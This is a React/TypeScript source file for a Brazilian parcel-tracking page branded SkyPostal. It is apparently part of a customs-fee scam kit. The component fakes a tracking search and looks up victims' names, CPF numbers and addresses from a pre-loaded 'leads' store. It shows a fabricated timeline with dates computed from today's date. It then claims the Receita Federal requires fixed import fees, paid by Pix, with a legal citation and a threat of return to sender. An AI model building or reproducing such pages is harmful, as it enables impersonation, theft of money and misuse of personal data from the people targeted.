import { useState, useEffect } from "react";
import { TrackingForm } from "@/components/TrackingForm";
import { Header } from "@/components/Header";
import { Logo } from "@/components/Logo";
import { Search } from "lucide-react";
import { formatAddress, formatCPF } from "@/lib/utils";
import { useLeadsStore } from "@/stores/leadsStore";
import { leadsRepository } from '@/lib/leadsRepository'
import type { Lead } from '@/types/lead'
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { useNavigate } from "react-router-dom"
import { useToast } from "@/components/ui/use-toast";
import { PixCheckout } from "@/components/PixCheckout";
import { useLanguage } from "@/hooks/useLanguage";
import type { CustomsOffice } from "@/lib/alfandegas";
import { CUSTOMS_OFFICES, findNearestByState } from "@/lib/alfandegas";
import { ClientLogos } from "@/components/ClientLogos";
import { ProductImageDisplay } from "@/components/ProductImageDisplay";

type Step = "tracking" | "dados";

interface CustomerData {
  name: string;
  cpf: string;
  email: string;
  telephone: string;
  country: string;
  state: string;
  city: string;
  address: string;
  zipcode: string;
  merchant: string;
  product: string;
  provider: string;
  service: string;
  tracking: string;
  providerInfo1: string;
  providerInfo2: string;
  providerInfo3: string;
}

interface TrackingAppProps {
  initialTrackingCode?: string;
}

export const TrackingApp = ({ initialTrackingCode }: TrackingAppProps) => {
  const [step, setStep] = useState<Step>("tracking");
  const [trackingCode, setTrackingCode] = useState(initialTrackingCode || "");
  const [selectedCountry, setSelectedCountry] = useState("BR");
  const [lead, setLead] = useState<Lead | null>(null);
  const [amounts] = useState({ taxaImportacao: 22.47, desembaraco: 21.96, encargos: 22.97 })
  const [showCheckout, setShowCheckout] = useState(false)
  const [awaitingPayment, setAwaitingPayment] = useState(false)
  const [showSearching, setShowSearching] = useState(false)
  const [searchStatus, setSearchStatus] = useState<"searching" | "found" | "notFound">("searching")
  const [isPaymentLoading, setIsPaymentLoading] = useState(false)
  const [currentPhrase, setCurrentPhrase] = useState(0)
  const [showNotFoundModal, setShowNotFoundModal] = useState(false)
  const [isTextTransitioning, setIsTextTransitioning] = useState(false)
  const navigate = useNavigate();
  const { toast } = useToast();
  const { t } = useLanguage();
  
  const [searchMessage, setSearchMessage] = useState(t('searching'));
  const [nearestOffice, setNearestOffice] = useState<CustomsOffice | null>(null);

  const total = (lead?.product ? 0 : 0) + amounts.taxaImportacao + amounts.desembaraco + amounts.encargos

  // Controla a rotação das frases animadas com fade in/out
  useEffect(() => {
    const interval = setInterval(() => {
      setIsTextTransitioning(true);
      
      // Aguarda o fade out
      setTimeout(() => {
        setCurrentPhrase((prev) => (prev + 1) % 4);
        setIsTextTransitioning(false);
      }, 500);
    }, 3000); // Muda a cada 3 segundos

    return () => clearInterval(interval);
  }, []);

  // Sincroniza o código inicial com o estado local
  useEffect(() => {
    if (initialTrackingCode && initialTrackingCode.trim() !== "") {
      setTrackingCode(initialTrackingCode);
    }
  }, [initialTrackingCode]);

  // Array com as frases na ordem especificada
  const phrases = [
    "Envios mais rápidos, econômicos e inteligentes.",
    "Segurança que protege o que é seu.",
    "Tecnologia que conecta toda a América.",
    "SkyPostal."
  ];

  // Seleciona automaticamente a alfândega mais próxima pelo estado do cliente,
  // ou tenta descobrir a UF usando ViaCEP caso o estado não esteja preenchido.
  useEffect(() => {
    const resolveNearest = async () => {
      const defaultOffice = CUSTOMS_OFFICES[0]
      try {
        // 1) Tenta extrair UF válida do campo state (ex.: "Pernambuco(PE)" -> "PE")
        if (lead?.state) {
          const upper = lead.state.toUpperCase()
          const match = upper.match(/\b(AC|AL|AP|AM|BA|CE|DF|ES|GO|MA|MT|MS|MG|PA|PB|PR|PE|PI|RJ|RN|RS|RO|RR|SC|SP|SE|TO)\b/)
          const ufFromState = match?.[1]
          if (ufFromState) {
            setNearestOffice(findNearestByState(ufFromState))
            return
          }
        }
        const rawCep = (lead?.zipcode || '').replace(/\D/g, '')
        if (rawCep.length === 8) {
          const res = await fetch(`https://viacep.com.br/ws/${rawCep}/json/`)
          const json: { uf?: string } = await res.json()
          if (json?.uf) {
            setNearestOffice(findNearestByState(json.uf))
            return
          }
        }
      } catch {
        // ignora e usa fallback
      }
      setNearestOffice(defaultOffice)
    }
    void resolveNearest()
  }, [lead?.state, lead?.zipcode])

  const handleTrackingSubmit = (code: string, country: string) => {
    setTrackingCode(code);
    setShowSearching(true);
    setSearchMessage(t('searching'));
    setSearchStatus("searching");
    
    // Simular busca por 5 segundos
    setTimeout(() => {
      void leadsRepository.findByTracking(code).then((found) => {
        if (found) {
          // Lead encontrado - mostrar mensagem de sucesso
          setSearchMessage(t('found'));
          setSearchStatus("found");
          
          // Aguardar um pouco para mostrar a mensagem de sucesso
          setTimeout(() => {
            setShowSearching(false);
            setLead(found);
            setAwaitingPayment(true);
            setStep("dados");
          }, 1500);
        } else {
          // Lead não encontrado - mostrar mensagem de erro
          setSearchMessage("Código não encontrado");
          setSearchStatus("notFound");
          
          // Aguardar um pouco para mostrar a mensagem de erro
          setTimeout(() => {
            setShowSearching(false);
            setShowNotFoundModal(true);
          }, 1500);
        }
      })
    }, 5000);
  };

  // No loading step anymore. Checkout abre em modal.

  const renderStep = () => {
    switch (step) {
      case "tracking":
        return (
          <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center px-4 py-8">
            {/* Animated Text Above Tracking Form */}
            <div className="text-center mb-8 px-4 max-w-3xl mx-auto">
              <div className="h-24 flex items-center justify-center">
                <div className={`animate-text-modern transition-all duration-500 ${
                  isTextTransitioning ? 'opacity-0 scale-95' : 'opacity-100 scale-100'
                }`}>
                  <p className="text-xl md:text-2xl font-medium text-gray-700 leading-relaxed px-2 font-clash-grotesk-bold">
                    {currentPhrase === 3 ? (
                      <>
                        <span className="text-gray-700">Tecnologia que conecta toda a América. </span>
                        <span className="text-blue-600 font-clash-grotesk-bold">SkyPostal</span>.
                      </>
                    ) : (
                      phrases[currentPhrase]
                    )}
                  </p>
                </div>
              </div>
            </div>
            
            <div className="w-full max-w-md space-y-8">
              <TrackingForm onSubmit={handleTrackingSubmit} initialValue={trackingCode} />
            </div>
            
            {/* Seção Nossos Clientes */}
            <div className="mt-16 md:mt-20">
              <ClientLogos />
            </div>
          </div>
        );



      case "dados":
        // Helpers de formatação
        const toTitleCase = (value: string) => value.toLowerCase().replace(/\b(\p{L})/gu, (m) => m.toUpperCase())
        // Removida a função formatCPF local, agora usa a importada

        // Preparar formatação de endereço em 3 linhas: 
        // 1) end - numero | 2) bairro - cidade | 3) estado - cep
        const raw = (lead?.address || '').trim()
        const parts = raw.split(',').map(p => p.trim()).filter(Boolean)
        const first = parts[0] || ''
        const second = parts[1] || ''
        let street = first
        let number = ''
        const match = first.match(/^(.*?)[\s,]+(\d+[A-Za-z0-9\-\/]*?)$/)
        if (match) {
          street = match[1]
          number = match[2]
        }
        // Aplicar formatação ao nome da rua
        const streetName = street ? formatAddress(street) : ''
        const bairroCandidate = second.replace(/^(CASA|APTO|APARTAMENTO|BL\.?|BLOCO|QD\.?|QUADRA|LT\.?|LOTE|FUNDOS|SETOR)\s*\d*/i, '').trim()
        const bairro = bairroCandidate ? formatAddress(bairroCandidate) : '—'
        const cidadeLabel = lead?.city ? formatAddress(lead.city) : '—'
        const estadoLabel = lead?.state ? formatAddress(lead.state) : '—'
        const cepLabel = lead?.zipcode || '—'
        const line1 = streetName ? (number ? `${streetName} - ${number}` : streetName) : '—'
        const line2 = `${bairro} - ${cidadeLabel}`
        const line3 = `${estadoLabel} - ${cepLabel}`
        return (
          <div className="min-h-screen bg-gray-50 px-4 py-8 pb-24">
            <div className="max-w-2xl mx-auto bg-white border border-border-light rounded-lg p-6 space-y-6 animate-in slide-in-from-bottom-4 duration-700 ease-out">
              <div className="flex items-start justify-between">
                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-base font-semibold tracking-wide text-text-primary">
                    <Search className="w-5 h-5 text-blue-600" />
                    <span>{trackingCode}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className={`flex items-center gap-2 ${awaitingPayment ? 'animate-pulse' : ''}`}>
                      <span className={`inline-block w-2 h-2 rounded-full ${awaitingPayment ? 'bg-orange-500 animate-bounce' : 'bg-red-600'}`} />
                      <span className={`${awaitingPayment ? 'text-orange-700' : 'text-red-700'} font-semibold uppercase text-sm`}>Aguardando pagamento</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Informações do Beneficiário e Entrega */}
              <div className="bg-surface-light rounded-lg p-4 border border-border-light animate-in slide-in-from-left-4 duration-500 delay-200 ease-out">
                <h3 className="font-semibold text-text-primary mb-3">Informações do Beneficiário e Entrega</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <div className="text-sm text-text-secondary font-medium">Nome:</div>
                    <div className="text-text-primary break-words">{lead?.name ? formatAddress(lead.name) : '—'}</div>
                  </div>
                  <div className="space-y-1">
                    <div className="text-sm text-text-secondary font-medium">CPF:</div>
                    <div className="text-text-primary break-words">{formatCPF(lead?.cpf)}</div>
                  </div>
                  <div className="space-y-1 md:col-span-2">
                  <div className="text-sm text-text-secondary font-medium">Endereço:</div>
                  <div className="text-text-primary break-words space-y-0.5">
                    <div>{line1}</div>
                    <div>{line2}</div>
                    <div>{line3}</div>
                  </div>
                  </div>
                </div>
              </div>

              {/* Informações do Produto com Foto */}
              <div className="bg-white border border-gray-200 rounded-lg p-6 animate-in slide-in-from-right-4 duration-500 delay-300 ease-out">
                <h3 className="font-semibold text-text-primary mb-4">Informações do Produto</h3>
                
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  {/* Foto do Produto */}
                  <div className="md:col-span-1">
                    <div className="text-sm text-text-secondary mb-2">Foto do Produto</div>
                    <ProductImageDisplay lead={lead} />
                  </div>
                  
                  {/* Detalhes do Produto */}
                  <div className="md:col-span-2 space-y-4">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <p className="text-sm text-text-secondary">Produto</p>
                        <p className="text-text-primary font-medium">{lead?.product ? formatAddress(lead.product) : 'Produto não identificado'}</p>
                      </div>
                      <div>
                        <p className="text-sm text-text-secondary">Loja</p>
                        <p className="text-text-primary font-medium">{lead?.merchant ? formatAddress(lead.merchant) : '—'}</p>
                      </div>
                      <div>
                        <p className="text-sm text-text-secondary">Provedor</p>
                        <p className="text-text-primary font-medium">SkyPostal</p>
                      </div>
                      <div>
                        <p className="text-sm text-text-secondary">Serviço</p>
                        <p className="text-text-primary font-medium">{lead?.service ? formatAddress(lead.service) : '—'}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>



              {/* Status de Rastreamento */}
              <div className="bg-gradient-to-br from-white to-gray-50 rounded-xl p-6 border border-gray-200 shadow-sm animate-in slide-in-from-bottom-4 duration-600 delay-400 ease-out">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                    <svg className="w-5 h-5 text-white flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-1.447-.894L15 4m0 13V4m0 0L9 7" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-gray-900">Status de Rastreamento</h3>
                    <p className="text-sm text-gray-600">Acompanhe o progresso da sua encomenda</p>
                  </div>
                </div>
                
                <div className="relative">
                  {/* Linha de progresso */}
                  <div className="absolute left-5 top-0 w-0.5 h-full bg-gradient-to-b from-green-400 via-blue-400 to-orange-400"></div>
                  
                  <div className="space-y-6">
                    {/* Status 1: Enviado */}
                    <div className="flex items-start gap-4 relative">
                                              <div className="flex-shrink-0 w-10 h-10 bg-gradient-to-br from-green-400 to-green-500 rounded-full flex items-center justify-center shadow-lg">
                          <img width="50" height="50" src="https://img.icons8.com/ios-filled/50/airplane-take-off.png" alt="airplane-take-off" className="w-5 h-5" style={{ filter: 'brightness(0) saturate(100%) invert(100%)' }} />
                        </div>
                      <div className="flex-1 pt-1">
                        <div className="text-base font-semibold text-gray-900">Enviado</div>
                        <div className="text-sm text-gray-600 mt-1">Pacote enviado pelo remetente - Miami Estados Unidos</div>
                        <div className="text-sm text-blue-600 font-medium mt-2 flex items-center gap-2">
                          <img width="16" height="16" src="https://img.icons8.com/material-outlined/24/calendar--v1.png" alt="calendar" className="w-4 h-4" style={{ filter: 'brightness(0) saturate(100%) invert(40%) sepia(100%) saturate(1000%) hue-rotate(200deg) brightness(100%) contrast(100%)' }} />
                          {new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toLocaleDateString('pt-BR')}
                        </div>
                      </div>
                    </div>
                    
                    {/* Status 2: Em Trânsito */}
                    <div className="flex items-start gap-4 relative">
                                              <div className="flex-shrink-0 w-10 h-10 bg-gradient-to-br from-blue-400 to-blue-500 rounded-full flex items-center justify-center shadow-lg">
                          <img width="50" height="50" src="https://img.icons8.com/ios-filled/50/truck.png" alt="truck" className="w-5 h-5 mx-auto" style={{ filter: 'brightness(0) saturate(100%) invert(100%)' }} />
                        </div>
                      <div className="flex-1 pt-1">
                                                  <div className="text-base font-semibold text-gray-900">Em Trânsito</div>
                        <div className="text-sm text-gray-600 mt-1">Pacote em rota para o Brasil - Estados Unidos - Brasil</div>
                        <div className="text-sm text-blue-600 font-medium mt-2 flex items-center gap-2">
                          <img width="16" height="16" src="https://img.icons8.com/material-outlined/24/calendar--v1.png" alt="calendar" className="w-4 h-4" style={{ filter: 'brightness(0) saturate(100%) invert(40%) sepia(100%) saturate(1000%) hue-rotate(200deg) brightness(100%) contrast(100%)' }} />
                          {new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toLocaleDateString('pt-BR')}
                        </div>
                      </div>
                    </div>
                    
                    {/* Status 3: Na Alfândega (Status Atual) */}
                    <div className="flex items-start gap-4 relative">
                      <div className="flex-shrink-0 w-10 h-10 bg-gradient-to-br from-orange-400 to-orange-500 rounded-full flex items-center justify-center shadow-lg animate-pulse">
                        <svg className="w-5 h-5 text-white flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" preserveAspectRatio="xMidYMid meet">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
                        </svg>
                      </div>
                      <div className="flex-1 pt-1">
                        <div className="text-base font-semibold text-orange-700 flex items-center gap-2">
                          Na Alfândega
                          <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-orange-100 text-orange-800">
                            Status Atual
                          </span>
                        </div>
                          <div className="text-sm text-gray-600 mt-1">Pacote retido para inspeção aduaneira - ALF - {nearestOffice ? `${nearestOffice.cidade} (${nearestOffice.estado})` : 'Unidade Local'} — Siscomex</div>
                        <div className="text-sm text-blue-600 font-medium mt-2 flex items-center gap-2">
                          <img width="16" height="16" src="https://img.icons8.com/material-outlined/24/calendar--v1.png" alt="calendar" className="w-4 h-4" style={{ filter: 'brightness(0) saturate(100%) invert(40%) sepia(100%) saturate(1000%) hue-rotate(200deg) brightness(100%) contrast(100%)' }} />
                          {new Date().toLocaleDateString('pt-BR')}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Guia de pagamento */}

              <div className="space-y-4 animate-in slide-in-from-right-4 duration-500 delay-600 ease-out">
                <div className="space-y-3">
                  <h3 className="text-base font-semibold text-text-primary">Guia de Pagamento - Órgão Tributador</h3>
                  <div className="bg-surface-light rounded-md border border-border-light p-4 space-y-2">
                    <div className="flex justify-between">
                      <span className="text-text-secondary">Taxa de Importação</span>
                      <span className="text-gray-500 font-medium">{amounts.taxaImportacao.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-text-secondary">Desembaraço Aduaneiro</span>
                      <span className="text-gray-500 font-medium">{amounts.desembaraco.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-text-secondary">Encargos Operacionais</span>
                      <span className="text-gray-500 font-medium">{amounts.encargos.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>
                    </div>
                    <div className="h-px bg-border-light my-2" />
                    <div className="flex justify-between text-base">
                      <span className="font-semibold text-text-primary">{t('total')}</span>
                      <span className="font-semibold text-text-primary">{total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>
                    </div>
                  </div>
                </div>
                {/* Órgão Tributador - contato e endereço */}
                <div className="bg-surface-light rounded-md border border-border-light p-4 text-sm text-text-secondary">
                  <div className="font-semibold text-text-primary mb-2">{t('customs')}</div>
                  {nearestOffice && (
                    <>
                      <div className="text-blue-600 font-medium mb-2">
                        {nearestOffice.nome}
                      </div>
                      <div className="space-y-1 text-sm">
                        <div><span className="font-medium">{t('phone')}:</span> {nearestOffice.telefone || '—'}</div>
                        <div><span className="font-medium">{t('address')}:</span> {nearestOffice.endereco}</div>
                        <div className="mt-2 text-xs text-gray-500">
                          {t('federalRevenue')}
                        </div>
                      </div>
                    </>
                  )}
                </div>
                <div className="pt-1">
                  <button
                    className="w-full bg-primary hover:bg-primary-hover text-white font-medium py-3 px-6 rounded-lg transition-all duration-300 shadow-lg hover:shadow-xl"
                    onClick={() => {
                      if (!isPaymentLoading) {
                        setIsPaymentLoading(true);
                        // Simular processo de pagamento
                        setTimeout(() => {
                          setIsPaymentLoading(false);
                          setAwaitingPayment(true);
                          setShowCheckout(true);
                        }, 3000); // 3 segundos de loading
                      }
                    }}
                    disabled={isPaymentLoading}
                  >
                    {isPaymentLoading ? (
                      <div className="flex items-center justify-center gap-2">
                        <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
                        <span>{t('processingPayment')}</span>
                      </div>
                    ) : (
                      t('releaseTax')
                    )}
                  </button>
                </div>
              </div>
            </div>

            {/* Mensagem informativa clean e moderna */}
            <div className="max-w-2xl mx-auto bg-white border border-gray-200 rounded-lg p-5 space-y-4 mt-6">
              <div className="space-y-3">
                <h3 className="text-base font-medium text-gray-900">
                  Sua encomenda está aguardando regularização para liberação na triagem aduaneira
                </h3>
                <p className="text-sm text-gray-600 leading-relaxed">
                  O recolhimento abaixo é exigido pela Receita Federal para conclusão do desembaraço.
                </p>
              </div>

              <div className="space-y-2.5">
                <div className="flex items-start gap-2.5">
                  <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-sm text-gray-700">Valores únicos referentes à importação, desembaraço e encargos operacionais</span>
                </div>
                
                <div className="flex items-start gap-2.5">
                  <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-sm text-gray-700">Após a confirmação, o processamento é imediato e o comprovante é enviado ao seu e-mail</span>
                </div>
                
                <div className="flex items-start gap-2.5">
                  <div className="w-1.5 h-1.5 bg-orange-500 rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-sm text-gray-700">Caso não regularizada, a encomenda poderá retornar ao remetente conforme prazos do operador</span>
                </div>
              </div>

              <div className="pt-2 border-t border-gray-100">
                <span className="text-xs text-gray-500">
                  Base legal: Lei nº 8.846/1994 (Emissão de documento fiscal e recolhimento de impostos)
                </span>
              </div>
            </div>
          </div>

        );

      default:
        return null;
    }
  };

  return (
    <>
      <Header />
      <main className="min-h-screen bg-gray-50">
        {renderStep()}
      </main>
      <Dialog open={showCheckout} onOpenChange={setShowCheckout}>
        <DialogContent className="sm:max-w-xl max-h-[90vh] overflow-auto no-scrollbar [&>button]:text-gray-500 [&>button:hover]:text-gray-700">
          <DialogHeader>
            <DialogTitle>{t('payment')}</DialogTitle>
          </DialogHeader>
          {lead && (
            <PixCheckout
              amount={total}
              trackingCode={trackingCode}
              customer={{
                name: lead.name,
                email: lead.email,
                phone: lead.telephone,
                document: {
                  type: "cpf",
                  number: lead.cpf,
                },
              }}
            />
          )}
        </DialogContent>
      </Dialog>

      {/* Popup de busca */}
      <Dialog open={showSearching} onOpenChange={setShowSearching}>
        <DialogContent className="sm:max-w-md [&>button]:hidden">
          <DialogHeader>
            <DialogTitle 
              className={`text-center transition-colors duration-300 ${
                searchStatus === "searching" ? "text-blue-600" : 
                searchStatus === "found" ? "text-green-600" : "text-red-600"
              }`}
            >
              {searchMessage}
            </DialogTitle>
          </DialogHeader>
          <div className="text-center space-y-6 py-8">
            {searchStatus === "searching" ? (
              <div className="animate-spin w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full mx-auto"></div>
            ) : searchStatus === "found" ? (
              <div className="w-16 h-16 mx-auto">
                <div className="w-full h-full bg-green-100 rounded-full flex items-center justify-center animate-in zoom-in duration-500">
                  <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
            ) : (
              <div className="w-16 h-16 mx-auto">
                <div className="w-full h-full bg-red-100 rounded-full flex items-center justify-center animate-in zoom-in duration-500">
                  <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                  </svg>
                </div>
              </div>
            )}
            <div className="space-y-2">
              <p className="text-text-secondary text-lg">{t('code')}: {trackingCode}</p>
              <p className="text-sm text-gray-500">
                {searchStatus === "searching" 
                  ? t('searchingMessage')
                  : searchStatus === "found"
                  ? t('found')
                  : "Verifique se o código está correto"
                }
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Popup de Lead não encontrado */}
      <Dialog open={showNotFoundModal} onOpenChange={setShowNotFoundModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-red-600">
              Código não encontrado
            </DialogTitle>
          </DialogHeader>
          <div className="text-center space-y-6 py-8">
            <div className="w-16 h-16 mx-auto">
              <div className="w-full h-full bg-red-100 rounded-full flex items-center justify-center animate-in zoom-in duration-500">
                <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                </svg>
              </div>
            </div>
            <div className="space-y-3">
              <p className="text-text-secondary text-lg">
                O código <span className="font-semibold">{trackingCode}</span> não foi encontrado em nossa base de dados.
              </p>
              <p className="text-sm text-gray-500">
                Verifique se o código está correto ou entre em contato com o suporte.
              </p>
            </div>
            <div className="flex justify-center">
              <Button 
                onClick={() => {
                  setShowNotFoundModal(false)
                  setStep("tracking")
                }}
                className="w-40"
              >
                Nova busca
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  )
};
